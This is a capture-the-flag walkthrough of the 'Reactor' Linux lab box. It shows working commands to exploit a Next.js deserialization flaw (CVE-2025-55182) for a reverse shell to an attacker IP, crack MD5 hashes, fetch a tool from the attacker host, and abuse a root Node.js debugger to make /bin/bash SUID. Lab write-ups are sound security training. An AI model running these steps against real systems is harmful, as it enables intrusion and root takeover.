Summary

Reactor is an easy Linux box. There's a Next.js app on port 3000 that's vulnerable to React2Shell (CVE-2025-55182), so you get code execution as the node user without logging in. The app ships a SQLite database full of MD5 password hashes. The engineer hash cracks to reactor1, and the same password works for the system account. For root, there's a Node.js process running as root with the debugger port open on localhost, so you attach to it and tell it to make /bin/bash SUID.

Recon

Full port scan:

sudo nmap -Pn -p- -sC -sV -T4 -oN nmap-scan.txt 10.129.95.38

Two ports: SSH on 22 and a web app on 3000. The headers give the stack away:

curl -sI http://10.129.95.38:3000/

HTTP/1.1 200 OK
X-Powered-By: Next.js
x-nextjs-cache: HIT

Wappalyzer showed the exact version, Next.js 15.0.3, which is in range for CVE-2025-55182.

Foothold: React2Shell (CVE-2025-55182)

Next.js server actions deserialize request data without checking it properly, so one crafted POST gets you RCE as whatever user runs the app. No auth needed.

I used the Chocapikk PoC to confirm it first:

python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt

python3 exploit.py -u http://10.129.95.38:3000/ -c "ls"

app
next.config.js
node_modules
package.json
reactor.db

Then a reverse shell:

python3 exploit.py -u http://10.129.95.38:3000/ -r -l 10.10.16.201 -p 4445 -P nc-mkfifo

That drops a shell as node. Upgrade it so it's actually usable:

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
stty rows 54 columns 209

Getting to engineer

The reactor.db file is the interesting bit:

sqlite3 reactor.db
sqlite> .tables
sensor_logs  users
sqlite> select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb

Plain MD5, no salt. rockyou cracks the engineer one straight away:

hashcat -m 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt
# 39d97110eafe2a9a68639812cd271e8e:reactor1

Password is reactor1, and it's reused for the system user:

su engineer   # reactor1

User flag

engineer@reactor:~$ cat user.txt
# <redacted>

Root: exposed Node debugger

Checking what root is running:

ps aux | grep root
root  1289  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

The --inspect flag opens the V8 debugger. Anything that can reach that port can run JavaScript inside the process, and this process runs as root. It's bound to localhost, but I'm already on the box, so that doesn't help them.

Pull websocat over, find the debugger's websocket URL, then send it one command:

wget http://10.10.16.201/websocat && chmod +x websocat
curl -s http://127.0.0.1:9229/json    # returns webSocketDebuggerUrl with a UUID

echo '{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require(\"child_process\").execSync(\"chmod +s /bin/bash\").toString()"}}' \
  | ./websocat ws://127.0.0.1:9229/876bb34f-73ac-488e-b5d4-60401c458902

Check bash is SUID now, then drop into a root shell:

ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash
bash -p

Root flag

bash-5.2# cat /root/root.txt
# <redacted>
